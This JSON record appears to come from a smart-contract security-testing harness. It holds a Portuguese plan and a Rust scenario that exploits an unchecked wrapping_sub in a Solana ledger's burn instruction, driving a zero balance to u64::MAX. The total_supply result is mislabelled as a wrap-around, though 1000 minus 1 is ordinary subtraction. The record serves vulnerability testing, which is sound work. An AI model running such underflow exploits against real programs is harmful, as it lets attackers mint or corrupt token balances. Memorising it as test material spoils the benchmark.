{
  "plan": "Inicializo o ledger com initial_supply=1000 e user_balance=0 via a instrucao initialize (baseline legitimo). Depois chamo burn com amount=1, que e maior que user_balance=0, para acionar o wrapping_sub. O efeito medido e que user_balance deu a volta para u64::MAX (underflow) em vez de a instrucao falhar, e total_supply tambem sofreu wrap-around.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let init_ix = env.anchor_ix(
    "initialize",
    &(1000u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let (system_program_id, system_program_account) = system_program_account();

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    (system_program_id, system_program_account),
];

let baseline = env.baseline("initialize ledger with supply 1000", &init_ix, &init_accounts);

let ledger_after_init = after(&baseline, &ledger_key).clone();

let burn_ix = env.anchor_ix(
    "burn",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let burn_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let r = env.attack("burn amount=1 with user_balance=0 (underflow)", &burn_ix, &burn_accounts);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &ledger_key).data();
    let user_balance = read_u64(data, 40);
    let total_supply = read_u64(data, 8);
    env.effect("user_balance wrapped to u64::MAX (underflow)", user_balance == u64::MAX);
    env.effect("total_supply wrapped to 999 (underflow)", total_supply == 999u64);
}"
}

